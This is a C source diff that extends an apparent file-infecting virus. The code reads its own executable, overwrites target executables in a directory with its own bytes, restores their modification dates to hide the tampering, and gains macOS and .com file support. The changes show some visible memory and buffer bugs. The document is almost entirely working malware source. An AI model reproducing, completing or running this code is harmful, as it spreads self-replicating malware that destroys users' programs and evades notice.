@@ -13,7 +13,7 @@ Bytes* getOwnBytes(const char* arg0){
 	//Get name of executable
 	char* execname;
 	#ifdef _WIN32
-		if(strcmp(getFileExtension(arg0),"exe\0")){
+		if(strcmp(getFileExtension(arg0),"exe\0") && strcmp(getFileExtension(arg0),"com\0")){
 			execname=(char*)malloc(sizeof(char)*(strlen(arg0)+4));
 			strcpy(execname,arg0);
 			strcat(execname,".exe");
@@ -31,6 +31,7 @@ Bytes* getOwnBytes(const char* arg0){
 	FILE* malfile=fopen(execname,"rb");
 	
 	//Check malfile size
+	
 	fseek(malfile,0,SEEK_END);
 	unsigned int malsize=ftell(malfile);
 	fseek(malfile,0,SEEK_SET);
@@ -60,12 +61,14 @@ Bytes* getOwnBytes(const char* arg0){
 bool infectTarget(const char* target, Bytes* malbytes){
 	const char* malcode=malbytes->value;
 	unsigned int malsize=malbytes->length;
-	free(malbytes);
 	
 	//Get temp directory
-	#ifdef _WIN32
+	#if defined(_WIN32)
 		char* tempdir=(char*)malloc(sizeof(char)*strlen(getenv("TEMP")));
 		strcpy(tempdir,getenv("TEMP"));
+	#elif defined(__APPLE__) && defined(__MACH__)
+		char* tempdir=(char*)malloc(sizeof(char)*strlen(getenv("TEMP")));
+		strcpy(tempdir,getenv("TMPDIR"));
 	#else
 		char* tempdir="/tmp";
 	#endif
@@ -73,7 +76,7 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	//Get info from target file
 	int64_t tardate=getFileModifiedDate(target);
 	
-	//Opentarget file
+	//Open target file
 	FILE* tarfile=fopen(target,"rb");
 	if(tarfile==NULL)return 0;
 	fseek(tarfile,0,SEEK_END);
@@ -83,8 +86,11 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	fread(tarcode,1,tarsize,tarfile);
 	fclose(tarfile);
 	
+	/* Not sure if we're actually going to implement this feature
+	   It makes it harder to pack the executable beforehand
+	
 	//Generate alphanumeric key(linkcode)
-	char linkcode[LINK_TAG_LENGTH];
+	char linkcode[LINK_TAG_LENGTH+1];
 	srand(time(NULL));
 	for(unsigned int i=0;i<LINK_TAG_LENGTH;i++){
 		linkcode[i]=(rand()%2)?rand()%10+48:rand()%26+65;
@@ -103,8 +109,11 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	for(unsigned int i=0;i<tarsize;i++){fprintf(linkfile,"%c",tarcode[i]);}
 	fclose(linkfile);
 	
+	*/
+	
 	//Clone self to target	
-	printf("Cloning...\n");
+	//malsize=(malsize>12000)?12000:malsize;
+	printf("Cloning...(ts:%d,ms:%d)\n",tarsize,malsize);
 	tarfile=fopen(target,"wb");
 	for(unsigned int i=0;i<malsize;i++){fprintf(tarfile,"%c",malcode[i]);}
 	if(tarsize>malsize){
@@ -115,9 +124,11 @@ bool infectTarget(const char* target, Bytes* malbytes){
 	setFileModifiedDate(target,tardate);
 	
 	//Free memory and return
-	free(linkpath);
+	//free(linkpath);
 	free(tarcode);
-	free(tempdir);
+	#ifndef __linux__
+		free(tempdir);
+	#endif
 	return 1;
 }
 
@@ -140,7 +151,34 @@ bool infectDirectory(const char* path, const char* arg0){
 				//Check if definite executable
 				Executable* exectype=getExecType(ls[i]);
 				if(exectype->is_exec){	
-					printf("%s\n",ls[i]);
+					printf("%s",ls[i]);
+					if(exectype->is_native ){
+						//Copy code
+						printf("(native)\n");
+						Bytes* bytes=getOwnBytes(arg0);
+						printf("%d",infectTarget(ls[i],bytes));
+						free(bytes);
+						
+					}else{
+						if(exectype->is_win){
+							//Get windows binary
+							printf("(windows)");
+							
+						}else if(exectype->is_elf){
+							//Get elf/linux binary
+							printf("(elf)");
+							
+						}else if(exectype->is_macho){
+							//Get OSX binary
+							printf("(mach-o)");
+							
+						}else{
+							printf("Error(clonelib.c) - No platform\n");
+							return false;
+						}
+						//Copy code from external binary
+					}
+					printf("\n");
 				}
 				//Free memory
 				free(exectype);
